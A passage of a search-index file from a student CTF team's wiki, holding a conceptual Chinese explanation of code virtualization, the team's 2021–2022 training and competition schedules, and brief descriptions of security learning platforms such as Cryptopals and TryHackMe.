u679c\u3002 +------------+ | \u5934\u90e8\u6307\u4ee4\u5e8f\u5217 | -------> | \u4ee3\u7801\u865a\u62df\u673a\u5165\u53e3 | |------------| | | | | \u4fdd\u5b58\u4ee3\u7801\u73b0\u573a | | | | | \u4e2d\u95f4\u6307\u4ee4\u5e8f\u5217 | | \u6a21\u62df\u6267\u884c\u4e2d\u95f4\u6307\u4ee4\u5e8f\u5217 | | | | | | | \u8bbe\u7f6e\u65b0\u7684\u4ee3\u7801\u73b0\u573a | |------------| | | \u5c3e\u90e8\u6307\u4ee4\u5e8f\u5217 | <------- | \u4ee3\u7801\u865a\u62df\u673a\u51fa\u53e3 | +------------+ \u5f53\u539f\u59cb\u6307\u4ee4\u6267\u884c\u5230\u6307\u4ee4\u5e8f\u5217\u7684\u5f00\u59cb\u5904\uff0c\u5c31\u8f6c\u5165\u4ee3\u7801\u865a\u62df\u673a\u7684\u5165\u53e3\u3002\u6b64\u65f6\u9700\u8981\u4fdd\u5b58\u5f53\u524d\u7ebf\u7a0b\u7684\u4e0a\u4e0b\u6587\u4fe1\u606f\uff0c\u7136\u540e\u8fdb\u5165\u6a21\u62df\u6267\u884c\u9636\u6bb5\uff0c\u8be5\u9636\u6bb5\u662f\u4ee3\u7801\u865a\u62df\u673a\u7684\u6838\u5fc3\u3002\u6709\u4e24\u79cd\u65b9\u6848\u6765\u4fdd\u8bc1\u865a\u62df\u673a\u4ee3\u7801\u4e0e\u539f\u59cb\u4ee3\u7801\u7684\u6808\u7a7a\u95f4\u4f7f\u7528\u4e92\u4e0d\u51b2\u7a81\uff0c\u4e00\u79cd\u662f\u5728\u5806\u4e0a\u5f00\u8f9f\u5f00\u8f9f\u65b0\u7684\u7a7a\u95f4\uff0c\u53e6\u4e00\u79cd\u662f\u7ee7\u7eed\u4f7f\u7528\u539f\u59cb\u4ee3\u7801\u6240\u4f7f\u7528\u7684\u6808\u7a7a\u95f4\uff0c\u8fd9\u4e24\u79cd\u65b9\u6848\u4e92\u6709\u4f18\u52a3\uff0c\u5728\u5b9e\u9645\u4e2d\u7b2c\u4e8c\u79cd\u4f7f\u7528\u8f83\u591a\u3002 \u5bf9\u4e8e\u600e\u6837\u6a21\u62df\u539f\u59cb\u4ee3\u7801\uff0c\u540c\u6837\u6709\u4e24\u79cd\u65b9\u6848\u3002\u4e00\u79cd\u662f\u5c06\u539f\u672c\u7684\u6307\u4ee4\u5e8f\u5217\u8f6c\u53d8\u4e3a\u4e00\u79cd\u5177\u6709\u76f4\u63a5\u6216\u8005\u95f4\u63a5\u5bf9\u5e94\u5173\u7cfb\u7684\uff0c\u53ea\u6709\u865a\u62df\u673a\u624d\u80fd\u7406\u89e3\u7684\u4ee3\u7801\u6570\u636e\u3002\u4f8b\u5982\u7528 0 \u6765\u8868\u793a push \uff0c 1 \u8868\u793a mov \u7b49\u3002\u8fd9\u79cd\u76f4\u63a5\u6216\u95f4\u63a5\u7b49\u4ef7\u7684\u6570\u636e\u79f0\u4e3a opcode\u3002\u53e6\u4e00\u79cd\u65b9\u6848\u662f\u5c06\u539f\u59cb\u4ee3\u7801\u7684\u610f\u4e49\u76f4\u63a5\u8f6c\u6362\u6210\u65b0\u7684\u4ee3\u7801\uff0c\u7c7b\u4f3c\u4e8e\u4ee3\u7801\u53d8\u5f62\uff0c\u8fd9\u79cd\u65b9\u6848\u57fa\u4e8e\u6307\u4ee4\u8bed\u4e49\uff0c\u6240\u4ee5\u8bbe\u8ba1\u96be\u5ea6\u975e\u5e38\u5927\u3002","title":"\u4ee3\u7801\u865a\u62df\u5316"},{"location":"Tutorial/Schedule/2021Fall/","text":"2021 Fall Schedule After the recruiting on September 4th, new members are going to learn basic ideas of CTF. The training project for 2021 fall is going to start in September, and will finish in November. After the training, another exam would be held. Schedule Data Title Intro Material Sep 11th 2021 Introduction to CTF, how to Search & Learn Learn about what's CTF and how we win a CTF. The attendance of competitions and how to group a team. Introduction to CTF.pdf Sep 19th 2021 Linux, Programming, and Toolkit Introduce how to operate a Linux system using CLI, and install your environment. Learn how to program with Python. Install the toolkit. Linux, Programming, and Toolkit Sep 25th 2021 Web Challenges and Databases Ability to learn computer networks and hack websites. Know HTTP & HTTPS in protocol, and tools to capture / modify packets. Web Challenges and Databases.pdf Oct 10th 2021 Forensics & Steganography Analyze the file format and hidden information. Packet or network traffic analysis as well. Several skills to check images. Forensics_Steganography.pdf Oct 16th 2021 Operating Systems Guide to the OS course, learning about modern operating systems from Windows, Linux, to Android. About hardware, process architecture, how OS schedule procedure. Operating Systems.pptx Oct 23th 2021 Modern Cryptography and Mathematics Asymmetric cryptography like RSA, ECC. A mathematic definition about security and attacks to the modern cryptography. Cryptography.pptx Oct 30th 2021 Assembly Language Learn about some CISC knowledge. Use x86_64 as example to do assembly. Some reverse engineering skills are involved. Reverse.pdf Nov 20th 2021 Binary Exploitations PWN challenges. Buffer overflows, shellcodes, ROP, and some pwn challenges. Binary Exploitation.pdf Nov 27th 2021 Post Penetration After acquire a shell or you want to use reverse shell to exploit websites. Use vulnerability database to search vulnerabilities. Privilege escalation in Linux system. Dec 4th 2021 AWD CTF From Jeopardy to AWD (Attack and Defense) CTF. Use an online AWD CTF to learn about vulnerability fix and exploit. Dec 11th 2021 Report Individual report of each new members about a topic you interested in. Dec 18th 2021 Exam Qualifier exam. Training Timeline There some major changes to our training timeline. According to the new goal of intro and improve , the lecture time is reduced to 1 hour in order to do more exercise. The offline training location is changed to Meeting Room 551 Engineering College South Tower because of the failure to get keys to TB2 (aka, picking locks are illegal). Training time stays unchanged: every Saturday 2pm - 6pm . 2021 Fall training timeline: 14:00 - 15:00 Lecture 15:30 - 18:00 Collaborate exercise Attendance It's highly recommend you to join offline in Meeting Room 551 Engineering College South Tower, but if you have any other arrangement, online attendance is fine. Any pigeons absence for 3 weeks would be stewed into pigeon soup. Because after 3 weeks of patting fish, you may forget the password of your own kali image.","title":"2021 Fall Schedule"},{"location":"Tutorial/Schedule/2021Fall/#2021-fall-schedule","text":"After the recruiting on September 4th, new members are going to learn basic ideas of CTF. The training project for 2021 fall is going to start in September, and will finish in November. After the training, another exam would be held.","title":"2021 Fall Schedule"},{"location":"Tutorial/Schedule/2021Fall/#schedule","text":"Data Title Intro Material Sep 11th 2021 Introduction to CTF, how to Search & Learn Learn about what's CTF and how we win a CTF. The attendance of competitions and how to group a team. Introduction to CTF.pdf Sep 19th 2021 Linux, Programming, and Toolkit Introduce how to operate a Linux system using CLI, and install your environment. Learn how to program with Python. Install the toolkit. Linux, Programming, and Toolkit Sep 25th 2021 Web Challenges and Databases Ability to learn computer networks and hack websites. Know HTTP & HTTPS in protocol, and tools to capture / modify packets. Web Challenges and Databases.pdf Oct 10th 2021 Forensics & Steganography Analyze the file format and hidden information. Packet or network traffic analysis as well. Several skills to check images. Forensics_Steganography.pdf Oct 16th 2021 Operating Systems Guide to the OS course, learning about modern operating systems from Windows, Linux, to Android. About hardware, process architecture, how OS schedule procedure. Operating Systems.pptx Oct 23th 2021 Modern Cryptography and Mathematics Asymmetric cryptography like RSA, ECC. A mathematic definition about security and attacks to the modern cryptography. Cryptography.pptx Oct 30th 2021 Assembly Language Learn about some CISC knowledge. Use x86_64 as example to do assembly. Some reverse engineering skills are involved. Reverse.pdf Nov 20th 2021 Binary Exploitations PWN challenges. Buffer overflows, shellcodes, ROP, and some pwn challenges. Binary Exploitation.pdf Nov 27th 2021 Post Penetration After acquire a shell or you want to use reverse shell to exploit websites. Use vulnerability database to search vulnerabilities. Privilege escalation in Linux system. Dec 4th 2021 AWD CTF From Jeopardy to AWD (Attack and Defense) CTF. Use an online AWD CTF to learn about vulnerability fix and exploit. Dec 11th 2021 Report Individual report of each new members about a topic you interested in. Dec 18th 2021 Exam Qualifier exam.","title":"Schedule"},{"location":"Tutorial/Schedule/2021Fall/#training-timeline","text":"There some major changes to our training timeline. According to the new goal of intro and improve , the lecture time is reduced to 1 hour in order to do more exercise. The offline training location is changed to Meeting Room 551 Engineering College South Tower because of the failure to get keys to TB2 (aka, picking locks are illegal). Training time stays unchanged: every Saturday 2pm - 6pm . 2021 Fall training timeline: 14:00 - 15:00 Lecture 15:30 - 18:00 Collaborate exercise","title":"Training Timeline"},{"location":"Tutorial/Schedule/2021Fall/#attendance","text":"It's highly recommend you to join offline in Meeting Room 551 Engineering College South Tower, but if you have any other arrangement, online attendance is fine. Any pigeons absence for 3 weeks would be stewed into pigeon soup. Because after 3 weeks of patting fish, you may forget the password of your own kali image.","title":"Attendance"},{"location":"Tutorial/Schedule/2022Spring/","text":"2022 Spring Time Schedule The time schedule for 2022 takes competition as major tasks. Currently, we have enough training for CTF techniques. Some of the competitions from 2022 Feb to 2022 July would be listed here. Be aware that the time schedule may adjust according to the competition arrangement. Weekly Schedule Every week we would have at least ONE competition and ONE presentation slide. The activity would be both online / offline. Online meeting for those can't participate in the offline meeting, while offline is the major component. Location: 515 Meeting Room, Southern Tower of Engineering Department Time: every Saturday from 2 pm to 6 pm Snacks and teatime are also included. Timeline Competition Time Format Comment DefCamp CTF 2022 Online 11 Feb, 17:00 CST \u2014 13 Feb 2022, 23:00 CST Jeopardy Rating weight: 43.08 CInsects CTF 2022 19 Feb, 19:00 CST \u2014 20 Feb 2022, 04:00 CST Attack-Defense AWD exercise Codegate CTF 2022 Preliminary 26 Feb, 18:00 CST \u2014 27 Feb 2022, 18:00 CST Jeopardy Top 10 teams will go on to the final match D^3CTF 2022 04 March, 20:00 CST \u2014 06 March 2022, 20:00 CST Jeopardy Top 12 teams will get awards DaVinciCTF 2022 12 March, 00:00 CST \u2014 14 March 2022, 00:00 CST Jeopardy Rating weight: 24.50 VolgaCTF 2022 Qualifier 19 March, 23:00 CST \u2014 20 March 2022, 23:00 CST Jeopardy Top teams will be invited to participate in VolgaCTF 2022 Final LINE CTF 2022 26 March, 08:00 CST \u2014 27 March 2022, 08:00 CST Jeopardy Rating weight: 23.68 Midnight Sun CTF 2022 Quals 02 April, 18:00 CST \u2014 03 April 2022, 18:00 CST Jeopardy Rating weight: 27.82 PlaidCTF 2022 09 April, 05:00 CST \u2014 11 April 2022, 05:00 CST Jeopardy Rating weight: 93.67 Personal Showcase The CTF team members will be invited to have a presentation every week before the competition. The goal of the showcase is to improve and sharing. The topic of the presentation can be various from challenge writeup to recently vulnerabilities. Anything useful for cybersecurity is fine. The current arrangement for the showcase: TBA Weekly Meeting Every Thursday we would have a short meeting online. If you have any question or advice, it's highly recommend to join the meeting and share with us.","title":"2022 Spring Time Schedule"},{"location":"Tutorial/Schedule/2022Spring/#2022-spring-time-schedule","text":"The time schedule for 2022 takes competition as major tasks. Currently, we have enough training for CTF techniques. Some of the competitions from 2022 Feb to 2022 July would be listed here. Be aware that the time schedule may adjust according to the competition arrangement.","title":"2022 Spring Time Schedule"},{"location":"Tutorial/Schedule/2022Spring/#weekly-schedule","text":"Every week we would have at least ONE competition and ONE presentation slide. The activity would be both online / offline. Online meeting for those can't participate in the offline meeting, while offline is the major component. Location: 515 Meeting Room, Southern Tower of Engineering Department Time: every Saturday from 2 pm to 6 pm Snacks and teatime are also included.","title":"Weekly Schedule"},{"location":"Tutorial/Schedule/2022Spring/#timeline","text":"Competition Time Format Comment DefCamp CTF 2022 Online 11 Feb, 17:00 CST \u2014 13 Feb 2022, 23:00 CST Jeopardy Rating weight: 43.08 CInsects CTF 2022 19 Feb, 19:00 CST \u2014 20 Feb 2022, 04:00 CST Attack-Defense AWD exercise Codegate CTF 2022 Preliminary 26 Feb, 18:00 CST \u2014 27 Feb 2022, 18:00 CST Jeopardy Top 10 teams will go on to the final match D^3CTF 2022 04 March, 20:00 CST \u2014 06 March 2022, 20:00 CST Jeopardy Top 12 teams will get awards DaVinciCTF 2022 12 March, 00:00 CST \u2014 14 March 2022, 00:00 CST Jeopardy Rating weight: 24.50 VolgaCTF 2022 Qualifier 19 March, 23:00 CST \u2014 20 March 2022, 23:00 CST Jeopardy Top teams will be invited to participate in VolgaCTF 2022 Final LINE CTF 2022 26 March, 08:00 CST \u2014 27 March 2022, 08:00 CST Jeopardy Rating weight: 23.68 Midnight Sun CTF 2022 Quals 02 April, 18:00 CST \u2014 03 April 2022, 18:00 CST Jeopardy Rating weight: 27.82 PlaidCTF 2022 09 April, 05:00 CST \u2014 11 April 2022, 05:00 CST Jeopardy Rating weight: 93.67","title":"Timeline"},{"location":"Tutorial/Schedule/2022Spring/#personal-showcase","text":"The CTF team members will be invited to have a presentation every week before the competition. The goal of the showcase is to improve and sharing. The topic of the presentation can be various from challenge writeup to recently vulnerabilities. Anything useful for cybersecurity is fine. The current arrangement for the showcase: TBA","title":"Personal Showcase"},{"location":"Tutorial/Schedule/2022Spring/#weekly-meeting","text":"Every Thursday we would have a short meeting online. If you have any question or advice, it's highly recommend to join the meeting and share with us.","title":"Weekly Meeting"},{"location":"Tutorial/Schedule/Summer/","text":"Summer Schedule 2021 The summer of 2021 is focusing on the beginners and our new members of team. Summer schedule is from basics of CTF to introduction to all the categories and basic knowledge. Schedule Date Title Intro Material July 31st 2021 Operating Systems Guide to the OS course, learning about modern operating systems from Windows, Linux, to Android. About hardware, process architecture, how OS schedule procedure. Computer Systems: A Programmer's Perspective Aug 7nd 2021 Computer Network and Protocols About computer network, how Internet works and basic protocols about computer network. Computer Networking: A Top-Down Approach Aug 14nd 2021 Modern Cryptography and Mathematics Asymmetric cryptography like RSA, ECC. A mathematic definition about security and attacks to the modern cryptography. Cryptography Theory and Practice Introduction to Modern Cryptography Aug 21st 2021 Penetration and Hacking From CTF challenges to the penetration testing and hacking a real system. Learn about how to carry out a real attack to the computer systems. The Hacker Playbook Aug 28th 2021 Ethics of Cybersecurity & Exam for CTF team Ethics of hacking and cybersecurity. From supply chain attack to Linux kernel to security research ethics. Learn about how to apply good penetration test instead of cracking. An Introduction to Cybersecurity Ethics Training Timeline The training location is at southern building of engineering college, 551 meeting room. If any changes to the training location, we would inform in advance. Welcome everyone to our training weekly. Summer training timeline: 14:00 - 14:30 Chatting and review of daily challenges 14:30 - 16:00 Lecture 16:10 - 17:00 Training sequence 1 17:10 - 18:00 Training sequence 2 Advice If you have any advice to the training, and about the topics of lecture, feel free to inform me and we can update training schedule according to your needs.","title":"Summer Schedule 2021"},{"location":"Tutorial/Schedule/Summer/#summer-schedule-2021","text":"The summer of 2021 is focusing on the beginners and our new members of team. Summer schedule is from basics of CTF to introduction to all the categories and basic knowledge.","title":"Summer Schedule 2021"},{"location":"Tutorial/Schedule/Summer/#schedule","text":"Date Title Intro Material July 31st 2021 Operating Systems Guide to the OS course, learning about modern operating systems from Windows, Linux, to Android. About hardware, process architecture, how OS schedule procedure. Computer Systems: A Programmer's Perspective Aug 7nd 2021 Computer Network and Protocols About computer network, how Internet works and basic protocols about computer network. Computer Networking: A Top-Down Approach Aug 14nd 2021 Modern Cryptography and Mathematics Asymmetric cryptography like RSA, ECC. A mathematic definition about security and attacks to the modern cryptography. Cryptography Theory and Practice Introduction to Modern Cryptography Aug 21st 2021 Penetration and Hacking From CTF challenges to the penetration testing and hacking a real system. Learn about how to carry out a real attack to the computer systems. The Hacker Playbook Aug 28th 2021 Ethics of Cybersecurity & Exam for CTF team Ethics of hacking and cybersecurity. From supply chain attack to Linux kernel to security research ethics. Learn about how to apply good penetration test instead of cracking. An Introduction to Cybersecurity Ethics","title":"Schedule"},{"location":"Tutorial/Schedule/Summer/#training-timeline","text":"The training location is at southern building of engineering college, 551 meeting room. If any changes to the training location, we would inform in advance. Welcome everyone to our training weekly. Summer training timeline: 14:00 - 14:30 Chatting and review of daily challenges 14:30 - 16:00 Lecture 16:10 - 17:00 Training sequence 1 17:10 - 18:00 Training sequence 2","title":"Training Timeline"},{"location":"Tutorial/Schedule/Summer/#advice","text":"If you have any advice to the training, and about the topics of lecture, feel free to inform me and we can update training schedule according to your needs.","title":"Advice"},{"location":"Website/Forum/kanxue/","text":"\u770b\u96ea\u5b66\u9662 Kanxue Security Documentation is a forum to post all things about cybersecurity from operating systems to web security, from binary exploitation to wiki and IoT security. The knowledge base contains good posts in forum. Reference Link: https://www.kanxue.com/chm.htm","title":"\u770b\u96ea\u5b66\u9662"},{"location":"Website/Forum/kanxue/#_1","text":"Kanxue Security Documentation is a forum to post all things about cybersecurity from operating systems to web security, from binary exploitation to wiki and IoT security. The knowledge base contains good posts in forum.","title":"\u770b\u96ea\u5b66\u9662"},{"location":"Website/Forum/kanxue/#reference","text":"Link: https://www.kanxue.com/chm.htm","title":"Reference"},{"location":"Website/Platform/CTFHub/","text":"CTFHub Easy to use CTF learn tutorial. Contains CTF events time schedule, skills that CTFers should learn, challenges provided, and tools and other assistant. Advantages and disadvantages CTF hub is a new CTF platform provided to help CTF gamers to train skills and get information of events. It's full of everything that is useful from tutorial to challenges. The skill tree is under construction and new contents are continuously added to the current components. CTF hub provides a calendar to check upcoming CTF competitions, subscribe the calendar to find new events. https://api.ctfhub.com/User_API/Event/getAllICS Reference CTF hub link: https://www.ctfhub.com/","title":"CTFHub"},{"location":"Website/Platform/CTFHub/#ctfhub","text":"Easy to use CTF learn tutorial. Contains CTF events time schedule, skills that CTFers should learn, challenges provided, and tools and other assistant.","title":"CTFHub"},{"location":"Website/Platform/CTFHub/#advantages-and-disadvantages","text":"CTF hub is a new CTF platform provided to help CTF gamers to train skills and get information of events. It's full of everything that is useful from tutorial to challenges. The skill tree is under construction and new contents are continuously added to the current components. CTF hub provides a calendar to check upcoming CTF competitions, subscribe the calendar to find new events. https://api.ctfhub.com/User_API/Event/getAllICS","title":"Advantages and disadvantages"},{"location":"Website/Platform/CTFHub/#reference","text":"CTF hub link: https://www.ctfhub.com/","title":"Reference"},{"location":"Website/Platform/CTFlearn/","text":"CTFlearn CTF learn is a challenge website for user update challenges and solve challenges. Those challenges are uploaded by community and users who solves the challenge can leave comments and score for the challenge. To submit flag and acquire scores, you need an account. In CTF learn, the accounts are free to register. Once you finish the registration, you may login with the account. For business user and education propose, CTF learn offers a professional edition called Learn++. Some online labs are also useful for beginners. Reference CTF learn link: https://ctflearn.com/","title":"CTFlearn"},{"location":"Website/Platform/CTFlearn/#ctflearn","text":"CTF learn is a challenge website for user update challenges and solve challenges. Those challenges are uploaded by community and users who solves the challenge can leave comments and score for the challenge. To submit flag and acquire scores, you need an account. In CTF learn, the accounts are free to register. Once you finish the registration, you may login with the account. For business user and education propose, CTF learn offers a professional edition called Learn++. Some online labs are also useful for beginners.","title":"CTFlearn"},{"location":"Website/Platform/CTFlearn/#reference","text":"CTF learn link: https://ctflearn.com/","title":"Reference"},{"location":"Website/Platform/Cryptopals/","text":"Cryptopals Crypto Challenges Welcome to the challenges Work in progress. This site will host all eight sets of our crypto challenges, with solutions in most mainstream languages. But: it doesn't yet. If we waited to hit \"publish\" until everything was here, we might be writing this in 2015. So we're publishing as we go. In particular: give us a little time on the challenge solutions. We can't introduce these any better than Maciej Ceglowski did, so read that blog post first. We've built a collection of 48 exercises that demonstrate attacks on real-world crypto. This is a different way to learn about crypto than taking a class or reading a book. We give you problems to solve. They're derived from weaknesses in real-world systems and modern cryptographic constructions. We give you enough info to learn about the underlying crypto concepts yourself. When you're finished, you'll not only have learned a good deal about how cryptosystems are built, but you'll also understand how they're attacked. What Are The Rules? There aren't any! For several years, we ran these challenges over email, and asked participants not to share their results. The honor system worked beautifully! But now we're ready to set aside the ceremony and just publish the challenges for everyone to work on. How Much Math Do I Need To Know? If you have any trouble with the math in these problems, you should be able to find a local 9th grader to help you out. It turns out that many modern crypto attacks don't involve much hard math. How Much Crypto Do I Need To Know? None. That's the point. So What Do I Need To Know? You'll want to be able to code proficiently in any language. We've received submissions in C, C++, Python, Ruby, Perl, Visual Basic, X86 Assembly, Haskell, and Lisp. Surprise us with another language. Our friend Maciej says these challenges are a good way to learn a new language, so maybe now's the time to pick up Clojure or Rust. What Should I Expect? Right now, we have eight sets. They get progressively harder. Again: these are based off real-world vulnerabilities. None of them are \"puzzles\". They're not designed to trip you up. Some of the attacks are clever, though, and if you're not familiar with crypto cleverness... well, you should like solving puzzles. An appreciation for early-90's MTV hip-hop can't hurt either. Can You Give Us A Long-Winded Indulgent Description For Why You'Ve Chosen To Do This? It turns out that we can. If you're not that familiar with crypto already, or if your familiarity comes mostly from things like Applied Cryptography, this fact may surprise you: most crypto is fatally broken. The systems we're relying on today that aren't known to be fatally broken are in a state of just waiting to be fatally broken. Nobody is sure that TLS 1.2 or SSH 2 or OTR are going to remain safe as designed. The current state of crypto software security is similar to the state of software security in the 1990s. Specifically: until around 1995, it was not common knowledge that software built by humans might have trouble counting. As a result, nobody could size a buffer properly, and humanity incurred billions of dollars in cleanup after a decade and a half of emergency fixes for memory corruption vulnerabilities. Counting is not a hard problem. But cryptography is. There are just a few things you can screw up to get the size of a buffer wrong. There are tens, probably hundreds, of obscure little things you can do to take a cryptosystem that should be secure even against an adversary with more CPU cores than there are atoms in the solar system, and make it solveable with a Perl script and 15 seconds. Don't take our word for it: do the challenges and you'll see. People \"know\" this already, but they don't really know it in their gut, and we think the reason for that is that very few people actually know how to implement the best-known attacks. So, mail us, and we'll give you a tour of them. How do I start? Start here! Who did this? Thomas Ptacek (@tqbf) Sean Devlin (@spdevlin) Alex Balducci (@iamalexalright) Marcin Wielgoszewski (@marcinw) Cryptopals is maintained and expanded (from Set 8 on) by Sean Devlin, in conjunction with the Cryptography Services Team at NCC Group . We could not possibly have done this without the help of several other people. Roughly in order of influence: Nate Lawson taught us virtually everything we know about cryptography. Trevor Perrin taught Nate some of that. I can tell you a pretty compelling story about how Trevor is the intellectual origin of every successful attack on TLS over the past 5 years. Thai Duong and Juliano Rizzo are the godfathers of practical cryptographic software security. Several things in this challenge didn't make sense to us until after Thai and Juliano exploited them in mainstream software. Legal Individual exercise submissions are owned by their author, and may or may not be distributed under an open source license. Links https://cryptopals.com/","title":"Cryptopals Crypto Challenges"},{"location":"Website/Platform/Cryptopals/#cryptopals-crypto-challenges","text":"","title":"Cryptopals Crypto Challenges"},{"location":"Website/Platform/Cryptopals/#welcome-to-the-challenges","text":"","title":"Welcome to the challenges"},{"location":"Website/Platform/Cryptopals/#work-in-progress","text":"This site will host all eight sets of our crypto challenges, with solutions in most mainstream languages. But: it doesn't yet. If we waited to hit \"publish\" until everything was here, we might be writing this in 2015. So we're publishing as we go. In particular: give us a little time on the challenge solutions. We can't introduce these any better than Maciej Ceglowski did, so read that blog post first. We've built a collection of 48 exercises that demonstrate attacks on real-world crypto. This is a different way to learn about crypto than taking a class or reading a book. We give you problems to solve. They're derived from weaknesses in real-world systems and modern cryptographic constructions. We give you enough info to learn about the underlying crypto concepts yourself. When you're finished, you'll not only have learned a good deal about how cryptosystems are built, but you'll also understand how they're attacked.","title":"Work in progress."},{"location":"Website/Platform/Cryptopals/#what-are-the-rules","text":"There aren't any! For several years, we ran these challenges over email, and asked participants not to share their results. The honor system worked beautifully! But now we're ready to set aside the ceremony and just publish the challenges for everyone to work on.","title":"What Are The Rules?"},{"location":"Website/Platform/Cryptopals/#how-much-math-do-i-need-to-know","text":"If you have any trouble with the math in these problems, you should be able to find a local 9th grader to help you out. It turns out that many modern crypto attacks don't involve much hard math.","title":"How Much Math Do I Need To Know?"},{"location":"Website/Platform/Cryptopals/#how-much-crypto-do-i-need-to-know","text":"None. That's the point.","title":"How Much Crypto Do I Need To Know?"},{"location":"Website/Platform/Cryptopals/#so-what-do-i-need-to-know","text":"You'll want to be able to code proficiently in any language. We've received submissions in C, C++, Python, Ruby, Perl, Visual Basic, X86 Assembly, Haskell, and Lisp. Surprise us with another language. Our friend Maciej says these challenges are a good way to learn a new language, so maybe now's the time to pick up Clojure or Rust.","title":"So What Do I Need To Know?"},{"location":"Website/Platform/Cryptopals/#what-should-i-expect","text":"Right now, we have eight sets. They get progressively harder. Again: these are based off real-world vulnerabilities. None of them are \"puzzles\". They're not designed to trip you up. Some of the attacks are clever, though, and if you're not familiar with crypto cleverness... well, you should like solving puzzles. An appreciation for early-90's MTV hip-hop can't hurt either.","title":"What Should I Expect?"},{"location":"Website/Platform/Cryptopals/#can-you-give-us-a-long-winded-indulgent-description-for-why-youve-chosen-to-do-this","text":"It turns out that we can. If you're not that familiar with crypto already, or if your familiarity comes mostly from things like Applied Cryptography, this fact may surprise you: most crypto is fatally broken. The systems we're relying on today that aren't known to be fatally broken are in a state of just waiting to be fatally broken. Nobody is sure that TLS 1.2 or SSH 2 or OTR are going to remain safe as designed. The current state of crypto software security is similar to the state of software security in the 1990s. Specifically: until around 1995, it was not common knowledge that software built by humans might have trouble counting. As a result, nobody could size a buffer properly, and humanity incurred billions of dollars in cleanup after a decade and a half of emergency fixes for memory corruption vulnerabilities. Counting is not a hard problem. But cryptography is. There are just a few things you can screw up to get the size of a buffer wrong. There are tens, probably hundreds, of obscure little things you can do to take a cryptosystem that should be secure even against an adversary with more CPU cores than there are atoms in the solar system, and make it solveable with a Perl script and 15 seconds. Don't take our word for it: do the challenges and you'll see. People \"know\" this already, but they don't really know it in their gut, and we think the reason for that is that very few people actually know how to implement the best-known attacks. So, mail us, and we'll give you a tour of them.","title":"Can You Give Us A Long-Winded Indulgent Description For Why You'Ve Chosen To Do This?"},{"location":"Website/Platform/Cryptopals/#how-do-i-start","text":"Start here!","title":"How do I start?"},{"location":"Website/Platform/Cryptopals/#who-did-this","text":"Thomas Ptacek (@tqbf) Sean Devlin (@spdevlin) Alex Balducci (@iamalexalright) Marcin Wielgoszewski (@marcinw) Cryptopals is maintained and expanded (from Set 8 on) by Sean Devlin, in conjunction with the Cryptography Services Team at NCC Group . We could not possibly have done this without the help of several other people. Roughly in order of influence: Nate Lawson taught us virtually everything we know about cryptography. Trevor Perrin taught Nate some of that. I can tell you a pretty compelling story about how Trevor is the intellectual origin of every successful attack on TLS over the past 5 years. Thai Duong and Juliano Rizzo are the godfathers of practical cryptographic software security. Several things in this challenge didn't make sense to us until after Thai and Juliano exploited them in mainstream software.","title":"Who did this?"},{"location":"Website/Platform/Cryptopals/#legal","text":"Individual exercise submissions are owned by their author, and may or may not be distributed under an open source license.","title":"Legal"},{"location":"Website/Platform/Cryptopals/#links","text":"https://cryptopals.com/","title":"Links"},{"location":"Website/Platform/TryHackMe/","text":"TryHackMe Here's another platform for learning and hacking. The difference between tryhackme and ordinary CTF challenge website is that thm uses rooms for challenge. Each room contains of several questions and you need to finish them all to solve a room. The room is also called a target environment in cyber security. In case that vulnerabilities are available in rooms, each room should be created for each user. That's say, you need to create a room and deploy machine before hacking. All target environments are on the thm's cloud server and you don't need to configure local machine to deploy target environment. However, you need to connect to the thm's local network so that you can hack the target environment. Two ways for user to connect. The first and free way is to use OpenVPN and configure your VPN with thm's ovpn file. The second is to use hack box, for community user, free box can only be used 1 hour one day. Otherwise, you need to purchase premium edition of thm. Rooms are also can be uploaded by users. This makes it possible for us to create our own target environment. Besides, thm provides several learning courses for beginners. For advanced users, there some other useful pages provided by thm. You can find some useful blog related to the cybersecurity and some other websites such like tutorials, terms, swag shop. TryHackMe is a great platform for both beginners and advanced hackers. Reference TryHackMe link: https://tryhackme.com/docs","title":"TryHackMe"},{"location":"Website/Platform/TryHackMe/#tryhackme","text":"Here's another platform for learning and hacking. The difference between tryhackme and ordinary CTF challenge website is that thm uses rooms for challenge. Each room contains of several questions and you need to finish them all to solve a room. The room is also called a target environment in cyber security. In case that vulnerabilities are available in rooms, each room should be created for each user. That's say, you need to create a room and deploy machine before hacking. All target environments are on the thm's cloud server and you don't need to configure local machine to deploy target environment. However, you need to connect to the thm's local network so that you can hack the target environment. Two ways for user to connect. The first and free way is to use OpenVPN and configure your VPN with thm's ovpn file. The second is to use hack box, for community user, free box can only be used 1 hour one day. Otherwise, you need to purchase premium edition of thm. Rooms are also can be uploaded by users. This makes it possible for us to create our own target environment. Besides, thm provides several learning courses for beginners. For advanced users, there some other useful pages provided by thm. You can find some useful blog related to the cybersecurity and some other websites such like tutorials, terms, swag shop. TryHackMe is a great platform for both beginners and advanced hackers.","title":"TryHackMe"},{"location":"Website/Platform/TryHackMe/#reference","text":"TryHackMe link: https://tryhackme.com/docs","title":"Reference"},{"location":"Website/Platform/World%20of%20Attack%26Defense/","text":"World of Attack&Defense World of Attack&Defense (Aka \u653b\u9632\u4e16\u754c) is another fully constructed CTF platform of challenges and event schedule. The challenge environment of WAD constructed from deployed machines that you need to deploy environment before solving the challenge. That is, in some time, the deployment environment of WAD is failed and users can not finish challenges. However, the challenge quality is pretty good and writeups submitted by users are also good to read. Reference World of Attack & Defense link: https://adworld.xctf.org.cn/","title":"World of Attack&Defense"},{"location":"Website/Platform/World%20of%20Attack%26Defense/#world-of-attackdefense","text":"World of Attack&Defense (Aka \u653b\u9632\u4e16\u754c) is another fully constructed CTF platform of challenges and event schedule. The challenge environment of WAD constructed from deployed machines that you need to deploy environment before solving the challenge. That is, in some time, the deployment environment of WAD is failed and users can not finish challenges. However, the challenge quality is pretty good and writeups submitted by users are also good to read.","title":"World of Attack&amp;Defense"},{"location":"Website/Platform/World%20of%20Attack%26Defense/#reference","text":"World of Attack & Defense link: https://adworld.xctf.org.cn/","title":"Reference"},{"location":"Website/Platform/ctftime/","text":"ctftime CTF time is a platform to provide schedule for upcoming and past CTF events. Famous CTF events usually synchronize their schedule to the CTF time, and CTFers all along the world would participate the event. Some famous CTF team also have their CTF time page to show their gains and record during the events. Along with the events schedule and team page, writeups are also collected by CTF time. Find writeups for the event by clicking corresponding event page and find Event tasks and writeups page. Find upcoming CTF events using CTF time. Reference CTF time link: https://ctftime.org/","title":"ctftime"},{"location":"Website/Platform/ctftime/#ctftime","text":"CTF time is a platform to provide schedule for upcoming and past CTF events. Famous CTF events usually synchronize their schedule to the CTF time, and CTFers all along the world would participate the event. Some famous CTF team also have their CTF time page to show their gains and record during the 